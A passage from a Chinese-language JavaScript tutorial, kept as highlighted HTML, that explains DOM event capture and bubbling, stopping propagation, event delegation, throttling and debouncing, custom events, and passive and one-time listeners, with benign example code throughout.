<span class="hljs-keyword">const</span> listener = <span class="hljs-title function_">clearAllListeners</span>();

<span class="hljs-comment">// 捕获阶段</span>
<span class="hljs-title function_">listener</span>(grandparent, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'1. Grandparent: 捕获阶段'</span>);
}, <span class="hljs-literal">true</span>);

<span class="hljs-title function_">listener</span>(parent, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'2. Parent: 捕获阶段'</span>);
}, <span class="hljs-literal">true</span>);

<span class="hljs-title function_">listener</span>(child, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'3. Child: 目标阶段'</span>);
}, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 冒泡阶段</span>
<span class="hljs-title function_">listener</span>(child, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'4. Child: 目标阶段'</span>);
}, <span class="hljs-literal">false</span>);

<span class="hljs-title function_">listener</span>(parent, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'5. Parent: 冒泡阶段'</span>);
}, <span class="hljs-literal">false</span>);

<span class="hljs-title function_">listener</span>(grandparent, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'6. Grandparent: 冒泡阶段'</span>);
}, <span class="hljs-literal">false</span>);

<span class="hljs-comment">// 点击按钮输出：</span>
<span class="hljs-comment">// 1. Grandparent: 捕获阶段</span>
<span class="hljs-comment">// 2. Parent: 捕获阶段</span>
<span class="hljs-comment">// 3. Child: 目标阶段</span>
<span class="hljs-comment">// 4. Child: 目标阶段</span>
<span class="hljs-comment">// 5. Parent: 冒泡阶段</span>
<span class="hljs-comment">// 6. Grandparent: 冒泡阶段</span>
</code></pre>
<h2 data-id="heading-10">5. 事件对象</h2>
<h3 data-id="heading-11">event 对象</h3>
<pre><code class="hljs language-js" lang="js">child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'事件对象属性:'</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'event.target:'</span>, event.<span class="hljs-property">target</span>);         <span class="hljs-comment">// 实际触发的元素</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'event.currentTarget:'</span>, event.<span class="hljs-property">currentTarget</span>); <span class="hljs-comment">// 当前处理元素</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'event.eventPhase:'</span>, event.<span class="hljs-property">eventPhase</span>);     <span class="hljs-comment">// 当前阶段</span>
  <span class="hljs-comment">// 1: 捕获, 2: 目标, 3: 冒泡</span>
}, <span class="hljs-literal">false</span>);
</code></pre>
<h2 data-id="heading-12">6. 控制事件传播</h2>
<h3 data-id="heading-13">6.1 event.stopPropagation()</h3>
<p>阻止事件继续传播</p>
<pre><code class="hljs language-js" lang="js">grandparent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Grandparent: 捕获阶段'</span>);
}, <span class="hljs-literal">true</span>);

parent.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Parent: 捕获阶段'</span>);
  e.<span class="hljs-title function_">stopPropagation</span>();  <span class="hljs-comment">// 停止传播</span>
}, <span class="hljs-literal">true</span>);

child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Child: 永远执行不到这里'</span>);
}, <span class="hljs-literal">true</span>);

<span class="hljs-comment">// 点击 child 输出：</span>
<span class="hljs-comment">// Grandparent: 捕获阶段</span>
<span class="hljs-comment">// Parent: 捕获阶段</span>
<span class="hljs-comment">// 停止传播，后续事件不会执行</span>
</code></pre>
<h3 data-id="heading-14">6.2 event.stopImmediatePropagation()</h3>
<p>阻止事件传播，并阻止同一元素的其他监听器</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handler1</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'handler1'</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">handler2</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'handler2'</span>);
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">handler3</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'handler3 执行前停止'</span>);
  event.<span class="hljs-title function_">stopImmediatePropagation</span>();
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">handler4</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'handler4 不会执行'</span>);
}

child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handler1);
child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handler2);
child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handler3);
child.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handler4);

<span class="hljs-comment">// 点击 child 输出：</span>
<span class="hljs-comment">// handler1</span>
<span class="hljs-comment">// handler2</span>
<span class="hljs-comment">// handler3 执行前停止</span>
<span class="hljs-comment">// handler4 不会执行</span>
</code></pre>
<h3 data-id="heading-15">6.3 event.preventDefault()</h3>
<p>阻止默认行为</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'myLink'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  e.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止链接跳转</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'链接被点击，但不会跳转'</span>);
});

form.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">e</span>) {
  e.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止表单提交</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'表单提交被阻止'</span>);
});
</code></pre>
<h2 data-id="heading-16">7. 事件委托 (Event Delegation)</h2>
<h3 data-id="heading-17">7.1 使用冒泡机制</h3>
<pre><code class="hljs language-js" lang="js">&lt;ul id=<span class="hljs-string">"todoList"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>任务1 <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete"</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>任务2 <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete"</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>任务3 <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete"</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>任务4 <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"delete"</span>&gt;</span>删除<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
&lt;/ul&gt;
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ❌ 低效的方法：为每个按钮添加监听器</span>
<span class="hljs-keyword">const</span> buttons = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.delete'</span>);
buttons.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">button</span> =&gt;</span> {
  button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-title function_">remove</span>();
  });
});

<span class="hljs-comment">// ✅ 高效的事件委托</span>
<span class="hljs-keyword">const</span> todoList = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'todoList'</span>);
todoList.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'delete'</span>)) {
    event.<span class="hljs-property">target</span>.<span class="hljs-property">parentElement</span>.<span class="hljs-title function_">remove</span>();
  }
});
</code></pre>
<h3 data-id="heading-18">7.2 动态添加元素</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 添加新任务</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">addNewTask</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> newLi = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">'li'</span>);
  newLi.<span class="hljs-property">innerHTML</span> = <span class="hljs-string">`新任务 &lt;button class="delete"&gt;删除&lt;/button&gt;`</span>;
  todoList.<span class="hljs-title function_">appendChild</span>(newLi);
  <span class="hljs-comment">// 无需为新按钮添加事件监听</span>
}
</code></pre>
<h2 data-id="heading-19">8. 实际应用示例</h2>
<h3 data-id="heading-20">示例1：嵌套菜单</h3>
<pre><code class="hljs language-js" lang="js">&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">"menu"</span>&gt;
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-toggle"</span>&gt;</span>菜单1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"submenu"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>选项1<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>选项2<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>选项3<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
&lt;/div&gt;

<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"menu-toggle"</span>&gt;</span>菜单2<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"submenu"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>选项A<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"#"</span>&gt;</span>选项B<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 事件委托处理所有菜单</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">const</span> target = event.<span class="hljs-property">target</span>;
  
  <span class="hljs-keyword">if</span> (target.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'menu-toggle'</span>)) {
    <span class="hljs-comment">// 切换菜单</span>
    <span class="hljs-keyword">const</span> submenu = target.<span class="hljs-property">nextElementSibling</span>;
    submenu.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = submenu.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> === <span class="hljs-string">'block'</span> ? <span class="hljs-string">'none'</span> : <span class="hljs-string">'block'</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (target.<span class="hljs-property">tagName</span> === <span class="hljs-string">'A'</span>) {
    <span class="hljs-comment">// 处理菜单项点击</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'选择了:'</span>, target.<span class="hljs-property">textContent</span>);
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-comment">// 点击外部，关闭所有菜单</span>
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.submenu'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">menu</span> =&gt;</span> {
      menu.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
    });
  }
});
</code></pre>
<h3 data-id="heading-21">示例2：模态框</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 事件委托实现点击外部关闭</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">const</span> modal = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'modal'</span>);
  <span class="hljs-keyword">const</span> closeBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'closeModal'</span>);
  <span class="hljs-keyword">const</span> openBtn = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'openModal'</span>);
  
  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">target</span> === openBtn) {
    modal.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'block'</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (event.<span class="hljs-property">target</span> === closeBtn || event.<span class="hljs-property">target</span> === modal) {
    modal.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> = <span class="hljs-string">'none'</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (modal.<span class="hljs-property">style</span>.<span class="hljs-property">display</span> === <span class="hljs-string">'block'</span>) {
    <span class="hljs-comment">// 防止冒泡</span>
    event.<span class="hljs-title function_">stopPropagation</span>();
  }
});

<span class="hljs-comment">// 阻止模态框内容点击关闭</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'modalContent'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  event.<span class="hljs-title function_">stopPropagation</span>();
});
</code></pre>
<h2 data-id="heading-22">9. 性能优化</h2>
<h3 data-id="heading-23">9.1 减少事件监听器数量</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ❌ 性能差：每个元素都添加监听器</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.item'</span>).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> {
  item.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleClick);
});

<span class="hljs-comment">// ✅ 性能好：一个父元素监听</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'container'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">target</span>.<span class="hljs-property">classList</span>.<span class="hljs-title function_">contains</span>(<span class="hljs-string">'item'</span>)) {
    <span class="hljs-title function_">handleClick</span>(event);
  }
});

<span class="hljs-comment">// 或者使用 closest</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">const</span> item = event.<span class="hljs-property">target</span>.<span class="hljs-title function_">closest</span>(<span class="hljs-string">'.item'</span>);
  <span class="hljs-keyword">if</span> (item) {
    <span class="hljs-title function_">handleClick</span>(event, item);
  }
});
</code></pre>
<h3 data-id="heading-24">9.2 防抖和节流</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 节流处理</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">throttle</span>(<span class="hljs-params">func, delay</span>) {
  <span class="hljs-keyword">let</span> lastCall = <span class="hljs-number">0</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-keyword">const</span> now = <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>();
    <span class="hljs-keyword">if</span> (now - lastCall &gt;= delay) {
      lastCall = now;
      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
    }
  };
}

<span class="hljs-comment">// 防抖处理</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">debounce</span>(<span class="hljs-params">func, delay</span>) {
  <span class="hljs-keyword">let</span> timer = <span class="hljs-literal">null</span>;
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-built_in">clearTimeout</span>(timer);
    timer = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
      func.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
    }, delay);
  };
}

<span class="hljs-comment">// 使用</span>
<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'scroll'</span>, <span class="hljs-title function_">throttle</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'滚动事件（节流）'</span>);
}, <span class="hljs-number">100</span>));

<span class="hljs-variable language_">window</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'resize'</span>, <span class="hljs-title function_">debounce</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'调整大小事件（防抖）'</span>);
}, <span class="hljs-number">250</span>));
</code></pre>
<h2 data-id="heading-25">10. 事件阶段常量</h2>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 事件阶段常量</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">Event</span> = {
  <span class="hljs-attr">NONE</span>: <span class="hljs-number">0</span>,            <span class="hljs-comment">// 无</span>
  <span class="hljs-attr">CAPTURING_PHASE</span>: <span class="hljs-number">1</span>,  <span class="hljs-comment">// 捕获</span>
  <span class="hljs-attr">AT_TARGET</span>: <span class="hljs-number">2</span>,        <span class="hljs-comment">// 目标</span>
  <span class="hljs-attr">BUBBLING_PHASE</span>: <span class="hljs-number">3</span>    <span class="hljs-comment">// 冒泡</span>
};

<span class="hljs-comment">// 使用</span>
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">switch</span>(event.<span class="hljs-property">eventPhase</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">Event</span>.<span class="hljs-property">CAPTURING_PHASE</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'捕获阶段'</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">Event</span>.<span class="hljs-property">AT_TARGET</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'目标阶段'</span>);
      <span class="hljs-keyword">break</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">Event</span>.<span class="hljs-property">BUBBLING_PHASE</span>:
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'冒泡阶段'</span>);
      <span class="hljs-keyword">break</span>;
  }
}, <span class="hljs-literal">true</span>);
</code></pre>
<h2 data-id="heading-26">11. 高级技巧</h2>
<h3 data-id="heading-27">11.1 自定义事件</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 创建自定义事件</span>
<span class="hljs-keyword">const</span> customEvent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomEvent</span>(<span class="hljs-string">'myEvent'</span>, {
  <span class="hljs-attr">bubbles</span>: <span class="hljs-literal">true</span>,     <span class="hljs-comment">// 是否冒泡</span>
  <span class="hljs-attr">cancelable</span>: <span class="hljs-literal">true</span>,  <span class="hljs-comment">// 是否可取消</span>
  <span class="hljs-attr">detail</span>: {          <span class="hljs-comment">// 自定义数据</span>
    <span class="hljs-attr">message</span>: <span class="hljs-string">'Hello World'</span>,
    <span class="hljs-attr">time</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()
  }
});

<span class="hljs-comment">// 监听自定义事件</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'myEvent'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'自定义事件触发:'</span>, event.<span class="hljs-property">detail</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'是否冒泡:'</span>, event.<span class="hljs-property">bubbles</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'目标元素:'</span>, event.<span class="hljs-property">target</span>);
});

<span class="hljs-comment">// 触发事件</span>
<span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">dispatchEvent</span>(customEvent);
}, <span class="hljs-number">1000</span>);
</code></pre>
<h3 data-id="heading-28">11.2 一次性事件监听</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 传统方法</span>
<span class="hljs-keyword">let</span> handled = <span class="hljs-literal">false</span>;
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span> <span class="hljs-title function_">handler</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">if</span> (handled) <span class="hljs-keyword">return</span>;
  handled = <span class="hljs-literal">true</span>;
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'只执行一次'</span>);
  element.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handler);
});

<span class="hljs-comment">// 使用 { once: true }</span>
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'只执行一次'</span>);
}, { <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> });

<span class="hljs-comment">// 捕获阶段也适用</span>
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'捕获阶段只执行一次'</span>);
}, { <span class="hljs-attr">capture</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">once</span>: <span class="hljs-literal">true</span> });
</code></pre>
<h3 data-id="heading-29">11.3 被动事件监听</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 提高滚动性能</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'wheel'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// 这里不会调用 preventDefault</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'滚动事件'</span>);
}, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> });

<span class="hljs-comment">// 尝试调用会出错</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'wheel'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-comment">// 在 passive 为 true 时，调用 preventDefault 会报错</span>
  <span class="hljs-comment">// event.preventDefault(); // TypeError</span>
}, { <span class="hljs-attr">passive</span>: <span class="hljs-literal">true</span> });
</code></pre>
<h2 data-id="heading-30">12. 常见问题</h2>
<h3 data-id="heading-31">12.1 阻止默认行为和冒泡</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'link'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  event.<span class="hljs-title function_">preventDefault</span>();  <span class="hljs-comment">// 阻止默认行为</span>
  event.<span class="hljs-title function_">stopPropagation</span>(); <span class="hljs-comment">// 阻止冒泡</span>
  
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'链接被点击，但不会跳转，也不会冒泡'</span>);
});

<span class="hljs-comment">// 在表单中使用</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">'form'</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'submit'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) {
  <span class="hljs-keyword">if</span> (!<span class="hljs-title function_">isValid</span>()) {
    event.<span class="hljs-title function_">preventDefault</span>();
    event.<span class="hljs-title function_">stopPropagation</span>();
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }
});
</code></pre>
<h3 data-id="heading-32">12.2 移除事件监听器</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">handleClick</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'点击事件'</span>);
}

<span class="hljs-comment">// 添加</span>
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, handleClick);

<span class="hljs-comment">// 移除（必须使用相同的函数引用）</span>
element.<span class="hljs-title function_">removeEventListener</span>(<span class="hljs-string">'click'</span>, handleClick);

<span class="hljs-comment">// ❌ 错误：匿名函数无法移除</span>
element.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">'click'</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'匿名函数'</span>);
});
